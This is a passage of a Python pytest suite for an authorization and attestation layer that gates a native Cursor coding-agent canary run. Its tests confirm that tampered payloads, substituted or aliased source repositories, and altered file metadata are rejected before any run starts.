    payload = build_authorization_payload(source_repository=h.source, source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(), run_id="run-one", session_id=h.session_id, attestation=h.attestation, run_root=tmp_path / "future-run", timeout_seconds=30)
    assert payload.backend_attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
    assert tuple(payload.attestation_non_claims) == WRAPPER_CHAIN_NON_CLAIMS
    install_root = Path(h.attestation.command_resolution.wrapper_root)
    later = install_root / "versions" / "2026.08.01-cafecafe"; later.mkdir()
    shutil.copy2(Path(sys.executable).resolve(), later / "node.exe")
    (later / "index.js").write_text("// newer entry\n", encoding="utf-8")
    (later / "package.json").write_text(json.dumps({"name": EXPECTED_CURSOR_PACKAGE_NAME}), encoding="utf-8")
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root, allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory, artifact_directory=h.store.artifact_directory, required_commit_message=REQUIRED_COMMIT_MESSAGE, required_material_paths=EXPECTED_MATERIAL_PATHS, execution_store=h.store)
    assert h.runner.invocations == []
    fresh = _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)
    new_payload = build_authorization_payload(source_repository=h.source, source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(), run_id="run-one", session_id=h.session_id, attestation=fresh, run_root=tmp_path / "future-run", timeout_seconds=30)
    assert new_payload.payload_fingerprint != payload.payload_fingerprint


def test_authorization_payload_rejects_mismatched_class_and_non_claims(tmp_path: Path):
    h, _ = _wrapper_chain_harness(tmp_path)
    payload = build_authorization_payload(source_repository=h.source, source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(), run_id="run-one", session_id=h.session_id, attestation=h.attestation, run_root=tmp_path / "future-run", timeout_seconds=30)
    for field, value in (
        ("backend_attestation_class", ATTESTATION_CLASS_PACKAGE_BIN),
        ("backend_attestation_class", "CURSOR_INSTALLATION_PROVEN"),
        ("attestation_non_claims", []),
        ("attestation_non_claims", list(WRAPPER_CHAIN_NON_CLAIMS[:-1])),
    ):
        changed = payload.to_dict(); changed[field] = value
        changed["payload_fingerprint"] = fingerprint({key: item for key, item in changed.items() if key != "payload_fingerprint"})
        with pytest.raises(ValueError):
            NativeCanaryAuthorizationPayload.from_dict(changed)


def test_real_host_wrapper_chain_preflight_is_static_and_truthfully_non_overclaiming():
    if os.name != "nt" or shutil.which("cursor-agent") is None:
        pytest.skip("Cursor Agent is not locally installed")
    decision = _preflight(config=_WRAPPER_CONFIG)
    if decision.status is not NativePreflightStatus.PREFLIGHT_READY:
        pytest.skip(f"local wrapper chain does not currently attest: {decision.detail}")
    assert decision.reason_code == WRAPPER_CHAIN_READY_REASON
    attestation = decision.attestation
    assert isinstance(attestation, WrapperChainBackendAttestation)
    assert attestation.claims["publisher_provenance_established"] is False
    assert attestation.claims["cli_capability_behavior_proven"] is False
    assert attestation.non_claims == WRAPPER_CHAIN_NON_CLAIMS
    assert "CURSOR_INSTALLATION_PROVEN" not in decision.reason_code


def test_prompt_header_and_no_agent_os_import():
    package=Path(__file__).resolve().parents[1]/"admissible"/"delegated_gate"; source=(package/"native_executor.py").read_text(encoding="utf-8")+(package/"native_canary.py").read_text(encoding="utf-8")
    assert "agent_os" not in source and build_native_agent_prompt(mission=create_canary_session(session_id="s").mission,gate_contract=create_canary_session(session_id="s").current_gate,work_workspace=Path.cwd()).startswith("You are the Admissible native coding agent.")


# --- Act 2A.3A: complete v3 authorization payload ---------------------------

from admissible.delegated_gate.canonical import canonical_bytes as _canonical_bytes
from admissible.delegated_gate.native_canary import (
    AUTHORIZATION_SCHEMA_VERSION,
    AUTHORIZATION_SCHEMA_VERSION_LEGACY_V2,
    CANARY_NON_CLAIMS,
    CLASS_READINESS_REASONS,
    EVIDENCE_DIRECTORY_NAME,
    NATIVE_SIDECAR_DIRECTORY_NAME,
    PACKAGE_BIN_READY_REASON,
    WORKSPACE_DIRECTORY_NAME,
    _authorized,
)

_V3_RUN_ID = "native-cursor-canary-001"


def _v3_payload(tmp_path: Path, *, run_id: str = _V3_RUN_ID, run_root: Path | None = None):
    _root, _discovery, attestation = _wrapper_attestation(tmp_path)
    source = tmp_path / "source-repo"; source.mkdir()
    run_root = run_root if run_root is not None else tmp_path / run_id
    payload = build_authorization_payload(
        source_repository=source, source_head="e" * 40, run_id=run_id, session_id=run_id,
        attestation=attestation, run_root=run_root, timeout_seconds=900,
    )
    return source, run_root, attestation, payload


def _refingerprint(data: dict) -> dict:
    data = dict(data)
    data["payload_fingerprint"] = fingerprint({k: v for k, v in data.items() if k != "payload_fingerprint"})
    return data


def _rebuild(data: dict) -> NativeCanaryAuthorizationPayload:
    return NativeCanaryAuthorizationPayload.from_dict(data)


def _owner_digest(phrase: str, payload: NativeCanaryAuthorizationPayload) -> str:
    return hashlib.sha256(phrase.encode("utf-8") + b"\0" + _canonical_bytes(payload.to_dict())).hexdigest()


def test_v3_round_trip_and_deterministic_fingerprint(tmp_path: Path):
    _s, run_root, _a, payload = _v3_payload(tmp_path)
    assert payload.schema_version == AUTHORIZATION_SCHEMA_VERSION == "admissible_native_canary_authorization_v3"
    twin_base = tmp_path / "twin"; twin_base.mkdir()
    _s2, _rr2, _a2, again = _v3_payload(twin_base)
    twin_root = tmp_path / "twin" / _V3_RUN_ID
    assert again.run_root == str(twin_root)
    reloaded = _rebuild(payload.to_dict()).validated()
    assert reloaded == payload and reloaded.payload_fingerprint == payload.payload_fingerprint
    assert not run_root.exists()


def test_v3_exact_proposed_run_validates_and_binds_roots(tmp_path: Path):
    _s, run_root, _a, payload = _v3_payload(tmp_path)
    assert payload.run_id == payload.session_id == _V3_RUN_ID
    assert payload.workspace_root == str(run_root / WORKSPACE_DIRECTORY_NAME)
    assert payload.evidence_root == str(run_root / EVIDENCE_DIRECTORY_NAME)
    assert payload.native_sidecar_root == str(run_root / EVIDENCE_DIRECTORY_NAME / NATIVE_SIDECAR_DIRECTORY_NAME)
    assert payload.backend_readiness_reason == WRAPPER_CHAIN_READY_REASON
    assert payload.backend_attestation_class == ATTESTATION_CLASS_WRAPPER_CHAIN
    assert tuple(payload.canary_non_claims) == CANARY_NON_CLAIMS
    payload.validated()


def test_v2_schema_cannot_authorize_new_live_path(tmp_path: Path):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    downgraded = _refingerprint({**payload.to_dict(), "schema_version": AUTHORIZATION_SCHEMA_VERSION_LEGACY_V2})
    with pytest.raises(ValueError):
        _rebuild(downgraded).validated()


@pytest.mark.parametrize("reason", ["", PACKAGE_BIN_READY_REASON, "SOME_UNKNOWN_REASON"])
def test_missing_or_mismatched_readiness_reason_rejected(tmp_path: Path, reason: str):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    altered = _refingerprint({**payload.to_dict(), "backend_readiness_reason": reason})
    with pytest.raises(ValueError):
        _rebuild(altered).validated()


@pytest.mark.parametrize("field", ["workspace_root", "native_sidecar_root", "evidence_root"])
def test_changed_bound_root_rejected_even_when_refingerprinted(tmp_path: Path, field: str):
    _s, run_root, _a, payload = _v3_payload(tmp_path)
    altered = _refingerprint({**payload.to_dict(), field: str(run_root / "elsewhere")})
    with pytest.raises(ValueError):
        _rebuild(altered).validated()


def test_run_root_inside_source_repository_rejected(tmp_path: Path):
    _root, _discovery, attestation = _wrapper_attestation(tmp_path)
    source = tmp_path / "source-repo"; source.mkdir()
    with pytest.raises(ValueError):
        build_authorization_payload(
            source_repository=source, source_head="e" * 40, run_id=_V3_RUN_ID, session_id=_V3_RUN_ID,
            attestation=attestation, run_root=source / _V3_RUN_ID, timeout_seconds=900,
        )


@pytest.mark.parametrize("index", range(len(CANARY_NON_CLAIMS)))
def test_each_canary_non_claim_mutation_rejected(tmp_path: Path, index: int):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    mutated = list(CANARY_NON_CLAIMS)
    mutated[index] = mutated[index] + " (tampered)"
    altered = _refingerprint({**payload.to_dict(), "canary_non_claims": mutated})
    with pytest.raises(ValueError):
        _rebuild(altered).validated()


def test_reordered_and_resized_canary_non_claims_rejected(tmp_path: Path):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    reordered = list(CANARY_NON_CLAIMS)
    reordered[0], reordered[1] = reordered[1], reordered[0]
    with pytest.raises(ValueError):
        _rebuild(_refingerprint({**payload.to_dict(), "canary_non_claims": reordered})).validated()
    dropped = list(CANARY_NON_CLAIMS)[:-1]
    with pytest.raises(ValueError):
        _rebuild(_refingerprint({**payload.to_dict(), "canary_non_claims": dropped})).validated()
    added = list(CANARY_NON_CLAIMS) + ["os sandboxing is guaranteed"]
    with pytest.raises(ValueError):
        _rebuild(_refingerprint({**payload.to_dict(), "canary_non_claims": added})).validated()


def test_payload_fingerprint_and_owner_digest_change_when_new_fields_change(tmp_path: Path):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    phrase = "one-time-random-owner-phrase"
    baseline_digest = _owner_digest(phrase, payload)
    alt_base = tmp_path / "alt"; alt_base.mkdir()
    _s2, _rr2, _a2, other = _v3_payload(alt_base)
    assert other.payload_fingerprint != payload.payload_fingerprint
    assert _owner_digest(phrase, other) != baseline_digest
    mutated = _refingerprint({**payload.to_dict(), "canary_non_claims": [c + "!" for c in CANARY_NON_CLAIMS]})
    assert mutated["payload_fingerprint"] != payload.payload_fingerprint


def test_owner_authorization_binds_full_v3_payload(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    phrase = "one-time-random-owner-phrase"
    monkeypatch.setenv("ADMISSIBLE_NATIVE_CANARY_OWNER_AUTHORIZATION_SHA256", _owner_digest(phrase, payload))
    assert _authorized(phrase, payload, active_source_repository=_s) and not _authorized("wrong", payload, active_source_repository=_s)
    for field, value in (
        ("workspace_root", str(_rr / "other")),
        ("native_sidecar_root", str(_rr / EVIDENCE_DIRECTORY_NAME / "other")),
    ):
        with pytest.raises(ValueError):
            _rebuild(_refingerprint({**payload.to_dict(), field: value}))


def test_preflight_only_payload_exposes_every_new_field(tmp_path: Path):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    emitted = payload.to_dict()
    for key in (
        "backend_attestation_class", "backend_readiness_reason", "attestation_non_claims",
        "canary_non_claims", "run_root", "workspace_root", "evidence_root", "native_sidecar_root",
    ):
        assert key in emitted, key
    assert emitted["canary_non_claims"] == list(CANARY_NON_CLAIMS)


# --- Act 2A.3A authorization authority repair --------------------------------

def _source_identity_dict(path: Path) -> dict[str, int]:
    return NativeFilesystemIdentity.from_stat(os.lstat(path)).validated().to_dict()


def _refingerprinted_source(payload: NativeCanaryAuthorizationPayload, source: Path) -> dict:
    return _refingerprint({
        **payload.to_dict(),
        "source_repository": str(source),
        "source_repository_identity": _source_identity_dict(source),
    })


def test_v3_source_path_is_structural_then_rebound_to_active_authority(tmp_path: Path):
    source, _rr, _a, payload = _v3_payload(tmp_path, run_root=tmp_path.parent / "outside-run")
    assert payload.validated_for_authorization(active_source_repository=source) is payload

    alternate = _refingerprint({**payload.to_dict(), "source_repository": str(source) + "\\."})
    with pytest.raises(ValueError, match="canonical"):
        NativeCanaryAuthorizationPayload.from_dict(alternate)
    alternate_separator = _refingerprint({**payload.to_dict(), "source_repository": str(source).replace("\\", "/")})
    with pytest.raises(ValueError, match="canonical"):
        NativeCanaryAuthorizationPayload.from_dict(alternate_separator)

    other = tmp_path / "other-canonical-directory"; other.mkdir()
    substituted = NativeCanaryAuthorizationPayload.from_dict(_refingerprinted_source(payload, other))
    with pytest.raises(ValueError, match="active source"):
        substituted.validated_for_authorization(active_source_repository=source)

    parent = source.parent
    parent_payload = NativeCanaryAuthorizationPayload.from_dict(_refingerprinted_source(payload, parent))
    with pytest.raises(ValueError, match="active source"):
        parent_payload.validated_for_authorization(active_source_repository=source)


def test_v3_source_another_git_repository_and_same_commit_clone_fail_authority(tmp_path: Path):
    left_parent = tmp_path / "left-parent"; left_parent.mkdir()
    right_parent = tmp_path / "right-parent"; right_parent.mkdir()
    source = build_canary_repository(left_parent, repository_name="source").repository
    same_commit_clone = build_canary_repository(right_parent, repository_name="clone").repository
    assert _command(["git", "rev-parse", "HEAD"], cwd=source).stdout == _command(["git", "rev-parse", "HEAD"], cwd=same_commit_clone).stdout
    _root, _discovery, attestation = _wrapper_attestation(tmp_path)
    payload = build_authorization_payload(
        source_repository=source, source_head="e" * 40, run_id=_V3_RUN_ID, session_id=_V3_RUN_ID,
        attestation=attestation, run_root=tmp_path.parent / "outside-git-run", timeout_seconds=900,
    )
    clone_payload = NativeCanaryAuthorizationPayload.from_dict(_refingerprinted_source(payload, same_commit_clone))
    with pytest.raises(ValueError, match="active source"):
        clone_payload.validated_for_authorization(active_source_repository=source)


def test_v3_source_symlink_or_junction_alias_is_rejected_structurally(tmp_path: Path):
    source, _rr, _a, payload = _v3_payload(tmp_path, run_root=tmp_path.parent / "outside-link-run")
    alias = tmp_path / "source-alias"
    try:
        os.symlink(source, alias, target_is_directory=True)
    except (OSError, NotImplementedError):
        if os.name != "nt":
            pytest.skip("directory symlink creation unavailable")
        completed = subprocess.run(["cmd.exe", "/d", "/c", "mklink", "/J", str(alias), str(source)], shell=False, capture_output=True)
        if completed.returncode != 0:
            pytest.skip("junction creation unavailable")
    raw = _refingerprint({**payload.to_dict(), "source_repository": str(alias)})
    with pytest.raises(ValueError, match="redirecting"):
        NativeCanaryAuthorizationPayload.from_dict(raw)


def test_v3_source_identity_replacement_fails_before_authority(tmp_path: Path):
    source, _rr, _a, payload = _v3_payload(tmp_path)
    displaced = tmp_path / "displaced-source"
    source.rename(displaced); source.mkdir()
    with pytest.raises(ValueError, match="identity changed"):
        NativeCanaryAuthorizationPayload.from_dict(payload.to_dict())


@pytest.mark.parametrize("missing", tuple(NativeCanaryAuthorizationPayload.__dataclass_fields__))
def test_v3_from_dict_rejects_every_missing_key(tmp_path: Path, missing: str):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    raw = payload.to_dict(); raw.pop(missing)
    with pytest.raises(ValueError, match="keys"):
        NativeCanaryAuthorizationPayload.from_dict(raw)


def test_v3_from_dict_rejects_unknown_and_malformed_json_arrays(tmp_path: Path):
    _s, _rr, _a, payload = _v3_payload(tmp_path)
    unknown = payload.to_dict(); unknown["unexpected"] = "authority expansion"
    with pytest.raises(ValueError, match="keys"):
        NativeCanaryAuthorizationPayload.from_dict(unknown)
    for key, value in (
        ("budgets", "11000"),
        ("budgets", [1, 1, 0, 0]),
        ("budgets", [1, True, 0, 0, 0]),
        ("launcher_prefix", "not-an-array"),
        ("launcher_prefix", [payload.launcher_prefix[0], payload.launcher_prefix[0]]),
        ("attestation_non_claims", "not-an-array"),
        ("canary_non_claims", [CANARY_NON_CLAIMS[0], CANARY_NON_CLAIMS[0]]),
    ):
        raw = _refingerprint({**payload.to_dict(), key: value})
        with pytest.raises(ValueError):
            NativeCanaryAuthorizationPayload.from_dict(raw)


def test_authorization_revalidates_before_digest_comparison(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    import admissible.delegated_gate.native_canary as native_canary_module

    source, _rr, _a, payload = _v3_payload(tmp_path)
    phrase = "synthetic-unit-test-phrase"
    monkeypatch.setenv("ADMISSIBLE_NATIVE_CANARY_OWNER_AUTHORIZATION_SHA256", _owner_digest(phrase, payload))
    compared: list[tuple[str, str]] = []
    monkeypatch.setattr(native_canary_module.hmac, "compare_digest", lambda left, right: compared.append((left, right)) or left == right)

    malformed = replace(payload, budgets=(1,))
    assert not _authorized(phrase, malformed, active_source_repository=source)
    wrong_claims = replace(payload, canary_non_claims=("canary is a sandbox",))
    assert not _authorized(phrase, wrong_claims, active_source_repository=source)
    other = tmp_path / "other"; other.mkdir()
    substituted = NativeCanaryAuthorizationPayload.from_dict(_refingerprinted_source(payload, other))
    assert not _authorized(phrase, substituted, active_source_repository=source)
    assert compared == []

    assert _authorized(phrase, payload, active_source_repository=source)
    assert len(compared) == 1
    assert not _authorized(phrase, malformed, active_source_repository=source)
    assert len(compared) == 1


def test_cli_missing_or_incorrect_synthetic_authorization_has_zero_run_effect(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]):
    h = _harness(tmp_path)
    head = _command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip()
    run_root = tmp_path / "cli-future-run"
    decision = NativePreflightDecision(NativePreflightStatus.PREFLIGHT_READY, "LOCAL_CURSOR_CAPABILITIES_ATTESTED", "synthetic test preflight", h.attestation)
    monkeypatch.setattr("admissible.delegated_gate.native_canary.preflight_native_cursor", lambda *, config: decision)
    args = ["--source-repository", str(h.source), "--required-source-head", head, "--run-root", str(run_root), "--run-id", "cli-future-run", "--session-id", h.session_id, "--executable", h.config.executable, "--executable-prefix-arg", h.config.launcher_prefix[0], "--timeout-seconds", "30"]
    assert main(args) == 2
    assert not run_root.exists() and h.runner.invocations == []
    monkeypatch.setenv("ADMISSIBLE_NATIVE_CANARY_OWNER_AUTHORIZATION_SHA256", "0" * 64)
    assert main([*args, "--owner-authorization", "synthetic-unit-test-phrase"]) == 2
    assert not run_root.exists() and h.runner.invocations == []
    assert all(json.loads(line)["status"] == NativeCanaryStatus.PREFLIGHT_BLOCKED.value for line in capsys.readouterr().out.splitlines())


def test_cli_preflight_only_rebinds_source_and_exposes_complete_payload_without_run_effect(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]):
    h = _harness(tmp_path)
    head = _command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip()
    run_root = tmp_path / "preflight-future-run"
    decision = NativePreflightDecision(NativePreflightStatus.PREFLIGHT_READY, "LOCAL_CURSOR_CAPABILITIES_ATTESTED", "synthetic test preflight", h.attestation)
    monkeypatch.setattr("admissible.delegated_gate.native_canary.preflight_native_cursor", lambda *, config: decision)
    args = ["--source-repository", str(h.source), "--required-source-head", head, "--run-root", str(run_root), "--run-id", "preflight-future-run", "--session-id", h.session_id, "--executable", h.config.executable, "--executable-prefix-arg", h.config.launcher_prefix[0], "--timeout-seconds", "30", "--preflight-only"]
    assert main(args) == 0
    emitted = json.loads(capsys.readouterr().out)
    payload = emitted["authorization_payload"]
    for key in NativeCanaryAuthorizationPayload.__dataclass_fields__:
        assert key in payload
    assert payload["source_repository"] == str(h.source)
    assert emitted["durability_capability"]["ready"] is True
    assert "durability_capability" not in payload
    assert not run_root.exists() and h.runner.invocations == []


def _ready_durability_capability() -> DurabilityCapabilityResult:
    return DurabilityCapabilityResult(
        platform="nt",
        profile_id="admissible_platform_durability_windows_movefileex_write_through_v1",
        filesystem_identity={"device": 1, "drive": "C:"},
        create_only_result=CapabilityStep.CONFLICT_PRESERVED,
        replace_result=CapabilityStep.SUCCEEDED,
        cleanup_result=CapabilityStep.SUCCEEDED,
        reason_code="PLATFORM_DURABILITY_CAPABILITY_READY",
        detail="synthetic production-path capability result",
    )


def test_capability_probe_precedes_payload_and_owner_digest_validation(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
):
    import admissible.delegated_gate.native_canary as native_canary_module

    h=_harness(tmp_path); head=_command(["git","rev-parse","HEAD"],cwd=h.source).stdout.strip()
    run_root=tmp_path/"ordered-future-run"
    decision=NativePreflightDecision(NativePreflightStatus.PREFLIGHT_READY,PACKAGE_BIN_READY_REASON,"synthetic test preflight",h.attestation)
    events: list[str]=[]
    monkeypatch.setattr(native_canary_module,"preflight_native_cursor",lambda *,config: decision)
    def probe(**kwargs):
        events.append("capability")
        assert not run_root.exists()
        return _ready_durability_capability()
    original_build=native_canary_module.build_authorization_payload
    def build(**kwargs):
        events.append("payload")
        return original_build(**kwargs)
    def authorized(*args,**kwargs):
        events.append("owner")
        return False
    monkeypatch.setattr(native_canary_module,"probe_platform_durability",probe)
    monkeypatch.setattr(native_canary_module,"build_authorization_payload",build)
    monkeypatch.setattr(native_canary_module,"_authorized",authorized)
    args=["--source-repository",str(h.source),"--required-source-head",head,"--run-root",str(run_root),"--run-id","ordered-future-run","--session-id",h.session_id,"--executable",h.config.executable,"--executable-prefix-arg",h.config.launcher_prefix[0],"--timeout-seconds","30","--owner-authorization","synthetic"]
    assert main(args)==2
    assert events==["capability","payload","owner"]
    assert not run_root.exists() and h.runner.invocations==[]
    assert json.loads(capsys.readouterr().out)["status"]==NativeCanaryStatus.PREFLIGHT_BLOCKED.value


def test_unsupported_capability_blocks_before_payload_authorization_and_run_root(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
):
    import admissible.delegated_gate.native_canary as native_canary_module

    h=_harness(tmp_path); head=_command(["git","rev-parse","HEAD"],cwd=h.source).stdout.strip()
    run_root=tmp_path/"blocked-future-run"
    decision=NativePreflightDecision(NativePreflightStatus.PREFLIGHT_READY,PACKAGE_BIN_READY_REASON,"synthetic test preflight",h.attestation)
    blocked_capability=replace(
        _ready_durability_capability(),
        create_only_result=CapabilityStep.FAILED,
        replace_result=CapabilityStep.NOT_RUN,
        reason_code="PUBLICATION_API_UNAVAILABLE",
        detail="write-through publication unavailable",
    )
    monkeypatch.setattr(native_canary_module,"preflight_native_cursor",lambda *,config: decision)
    monkeypatch.setattr(native_canary_module,"probe_platform_durability",lambda **kwargs: blocked_capability)
    monkeypatch.setattr(native_canary_module,"build_authorization_payload",lambda **kwargs: (_ for _ in ()).throw(AssertionError("payload construction must be downstream")))
    monkeypatch.setattr(native_canary_module,"_authorized",lambda *args,**kwargs: (_ for _ in ()).throw(AssertionError("owner digest must not be inspected")))
    args=["--source-repository",str(h.source),"--required-source-head",head,"--run-root",str(run_root),"--run-id","blocked-future-run","--session-id",h.session_id,"--executable",h.config.executable,"--executable-prefix-arg",h.config.launcher_prefix[0],"--timeout-seconds","30","--owner-authorization","synthetic"]
    assert main(args)==2
    emitted=json.loads(capsys.readouterr().out)
    assert emitted["reason_code"]=="PUBLICATION_API_UNAVAILABLE"
    assert emitted["durability_capability"]["cleanup_result"]==CapabilityStep.SUCCEEDED.value
    assert not run_root.exists() and h.runner.invocations==[]


def test_cli_rejects_existing_terminal_shaped_run_before_probe_or_authorization(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
):
    import admissible.delegated_gate.native_canary as native_canary_module

    h=_harness(tmp_path); head=_command(["git","rev-parse","HEAD"],cwd=h.source).stdout.strip()
    run_root=tmp_path/"synthetic-terminal-run"; evidence=run_root/"evidence"; evidence.mkdir(parents=True)
    terminal=evidence/"final-status.json"; terminal.write_bytes(b'{"status":"DURABILITY_UNCERTAIN"}\n')
    before=terminal.read_bytes()
    decision=NativePreflightDecision(NativePreflightStatus.PREFLIGHT_READY,PACKAGE_BIN_READY_REASON,"synthetic test preflight",h.attestation)
    monkeypatch.setattr(native_canary_module,"preflight_native_cursor",lambda *,config: decision)
    monkeypatch.setattr(native_canary_module,"probe_platform_durability",lambda **kwargs: (_ for _ in ()).throw(AssertionError("existing root must block before probe")))
    monkeypatch.setattr(native_canary_module,"build_authorization_payload",lambda **kwargs: (_ for _ in ()).throw(AssertionError("existing root must block before payload")))
    monkeypatch.setattr(native_canary_module,"_authorized",lambda *args,**kwargs: (_ for _ in ()).throw(AssertionError("existing root must block before owner validation")))
    args=["--source-repository",str(h.source),"--required-source-head",head,"--run-root",str(run_root),"--run-id","synthetic-terminal-run","--session-id",h.session_id,"--executable",h.config.executable,"--executable-prefix-arg",h.config.launcher_prefix[0],"--timeout-seconds","30","--owner-authorization","synthetic"]
    assert main(args)==2
    emitted=json.loads(capsys.readouterr().out)
    assert emitted["status"]==NativeCanaryStatus.PREFLIGHT_BLOCKED.value
    assert "fresh" in emitted["detail"]
    assert terminal.read_bytes()==before and h.runner.invocations==[]


# --- Act 2A.3C: deterministic directory identity normalization -------------

class _StatOverride:
    def __init__(self, metadata: os.stat_result, **overrides: int) -> None:
        self._metadata = metadata
        self._overrides = overrides

    def __getattr__(self, name: str) -> object:
        if name in self._overrides:
            return self._overrides[name]
        return getattr(self._metadata, name)


def _override_lstat(monkeypatch: pytest.MonkeyPatch, rules: dict[Path, object]) -> None:
    original = os.lstat
    normalized = {os.path.normcase(os.path.abspath(os.fspath(path))): rule for path, rule in rules.items()}
    calls = {key: 0 for key in normalized}

    def observed(path: str | bytes | Path, *args: object, **kwargs: object) -> os.stat_result:
        metadata = original(path, *args, **kwargs)
        key = os.path.normcase(os.path.abspath(os.fsdecode(path)))
        rule = normalized.get(key)
        if rule is None:
            return metadata
        index = calls[key]
        calls[key] += 1
        overrides = rule(index, metadata) if callable(rule) else rule
        return _StatOverride(metadata, **overrides)  # type: ignore[return-value, arg-type]

    monkeypatch.setattr(os, "lstat", observed)


def _alternating_directory_size(index: int, _metadata: os.stat_result) -> dict[str, int]:
    values = (0, 4096, 8192, 40960, 12345)
    return {"st_size": values[index % len(values)]}


def test_directory_identity_normalizes_alternating_raw_sizes_and_rejects_noncanonical_json(tmp_path: Path):
    directory = tmp_path / "directory"; directory.mkdir()
    metadata = os.lstat(directory)
    identities = tuple(
        NativeFilesystemIdentity.from_stat(_StatOverride(metadata, st_size=size))
        for size in (0, 4096, 8192, 40960, 12345)
    )
    assert all(item.entry_kind == "DIRECTORY" and item.size == 0 for item in identities)
    assert len({json.dumps(item.to_dict(), sort_keys=True) for item in identities}) == 1
    assert len({fingerprint(item.to_dict()) for item in identities}) == 1
    noncanonical = identities[0].to_dict(); noncanonical["size"] = 40960
    with pytest.raises(ValueError, match="canonical zero"):
        NativeFilesystemIdentity.from_dict(noncanonical)


def test_directory_identity_binds_metadata_and_rejects_entry_kind_substitution(tmp_path: Path):
    directory = tmp_path / "directory"; directory.mkdir()
    regular_file = tmp_path / "regular.txt"; regular_file.write_text("regular", encoding="utf-8")
    identity = _test_identity(directory)
    changed_directory_mode = identity.mode ^ stat.S_IWUSR
    if not stat.S_ISDIR(changed_directory_mode):
        changed_directory_mode = identity.mode ^ stat.S_IRUSR
    variants = (
        replace(identity, device=identity.device + 1),
        replace(identity, inode=identity.inode + 1),
        replace(identity, mode=changed_directory_mode),
        replace(identity, file_attributes=identity.file_attributes ^ 0x2),
        replace(identity, mtime_ns=identity.mtime_ns + 1),
    )
    assert all(not _same_directory_identity(identity, variant) for variant in variants)
    file_identity = _test_identity(regular_file)
    with pytest.raises(ValueError, match="requires directories"):
        _same_directory_identity(identity, file_identity)
    with pytest.raises(ValueError, match="requires directories"):
        _same_directory_identity(file_identity, identity)
    unsupported = replace(identity, mode=stat.S_IFIFO)
    with pytest.raises(ValueError, match="unsupported"):
        unsupported.validated()


@pytest.mark.parametrize(
    ("metadata_field", "identity_field"),
    (
        ("st_dev", "device"),
        ("st_ino", "inode"),
        ("st_mode", "mode"),
        ("st_file_attributes", "file_attributes"),
        ("st_mtime_ns", "mtime_ns"),
    ),
)
def test_regular_file_metadata_mutation_blocks_fresh_file_attestation_and_outer_refingerprint(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, metadata_field: str, identity_field: str,
):
    config, attestor = _injected_test_cursor(tmp_path)
    outer_attestation = attestor(config)
    authority = outer_attestation.executable
    path = Path(authority.canonical_path)
    original_metadata = os.lstat(path)
    original_identity = authority.filesystem_identity

    assert authority.validated() is authority
    assert outer_attestation.validated() is outer_attestation
    assert stat.S_ISREG(original_metadata.st_mode)
    assert original_identity == NativeFilesystemIdentity.from_stat(original_metadata)
    assert authority.byte_count == original_identity.size == int(original_metadata.st_size)
    assert authority.sha256 == hashlib.sha256(path.read_bytes()).hexdigest()

    def altered(_index: int, metadata: os.stat_result) -> dict[str, int]:
        value = int(getattr(metadata, metadata_field, 0))
        if metadata_field == "st_mode":
            changed_mode = value ^ stat.S_IWUSR
            assert stat.S_ISREG(changed_mode)
            return {metadata_field: changed_mode}
        if metadata_field == "st_file_attributes":
            return {metadata_field: value ^ 0x2}
        return {metadata_field: value + 1}

    _override_lstat(monkeypatch, {path: altered})
    fresh_identity = NativeFilesystemIdentity.from_stat(os.lstat(path))

    assert authority.canonical_path == str(path)
    assert fresh_identity.entry_kind == "REGULAR_FILE"
    assert fresh_identity.size == authority.byte_count == int(original_metadata.st_size)
    assert authority.sha256 == hashlib.sha256(path.read_bytes()).hexdigest()
    changed_fields = tuple(
        field for field in ("device", "inode", "mode", "file_attributes", "mtime_ns", "size")
        if getattr(fresh_identity, field) != getattr(original_identity, field)
    )
    assert changed_fields == (identity_field,)

    with pytest.raises(ValueError, match="identity changed"):
        authority.validated()
    provisional = replace(outer_attestation, attestation_fingerprint="0" * 64)
    refingerprinted = replace(
        provisional, attestation_fingerprint=fingerprint(provisional._body()),
    )
    with pytest.raises(ValueError, match="identity changed"):
        refingerprinted.validated()


def test_regular_file_identity_retains_exact_size_hash_and_substitution_authority(tmp_path: Path):
    path = tmp_path / "authority.bin"; path.write_bytes(b"aa")
    original = NativeBackendFileAttestation.observe(path, "regular authority")
    path.write_bytes(b"bb")
    same_size_changed_content = NativeBackendFileAttestation.observe(path, "changed regular authority")
    assert same_size_changed_content.filesystem_identity.size == original.filesystem_identity.size == 2
    assert same_size_changed_content.sha256 != original.sha256
    with pytest.raises(ValueError):
        original.validated()
    path.write_bytes(b"longer")
    changed_size = NativeBackendFileAttestation.observe(path, "resized regular authority")
    assert changed_size.filesystem_identity.size != original.filesystem_identity.size
    displaced = tmp_path / "displaced.bin"; path.rename(displaced); path.write_bytes(b"longer")
    with pytest.raises(ValueError):
        changed_size.validated()


def test_same_path_regular_file_replaced_by_directory_fails_fresh_file_authority(tmp_path: Path):
    path = tmp_path / "same-path-entry"
    path.write_bytes(b"regular authority")
